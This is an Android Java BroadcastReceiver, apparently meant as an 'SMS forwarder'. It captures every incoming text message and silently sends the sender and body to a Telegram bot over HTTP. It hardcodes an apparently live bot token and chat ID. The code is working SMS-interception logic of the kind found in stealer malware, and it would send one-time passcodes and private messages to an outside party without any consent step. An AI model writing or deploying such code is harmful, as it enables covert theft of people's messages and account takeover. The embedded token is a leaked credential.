package com.example.smsforwarder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

 public class SmsReceiver extends BroadcastReceiver {

    // Replace with your real bot token and chat ID
    private static final String BOT_TOKEN = "8420609996:AAGqIG3cJWxcUqQkktOxAF9YoaqQeEhceQ8";
    private static final String CHAT_ID = "7674662063";

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = sms.getDisplayOriginatingAddress();
                    String message = sms.getMessageBody();
                    sendToTelegram("From: " + sender + "\n" + message);
                }
            }
        }
    }

    private void sendToTelegram(String message) {
        new Thread(() -> {
            try {
                String text = URLEncoder.encode(message, "UTF-8");
                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
                        "/sendMessage?chat_id=" + CHAT_ID + "&text=" + text;

                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.getInputStream(); // trigger the request
                conn.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
